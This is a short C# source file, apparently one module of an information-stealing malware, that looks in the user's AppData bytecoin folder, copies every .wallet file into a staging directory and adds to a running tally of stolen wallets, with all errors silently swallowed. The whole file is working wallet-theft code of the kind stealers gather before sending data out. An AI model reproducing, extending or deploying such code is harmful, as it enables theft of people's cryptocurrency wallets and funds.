using System.IO;

namespace exos;

internal class Bytecoin
{
	public static int count;

	public static void BCNcoinStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\bytecoin").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
				if (fileInfo.Extension.Equals(".wallet"))
				{
					fileInfo.CopyTo(directorypath + "\\Bytecoin\\" + fileInfo.Name);
				}
			}
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
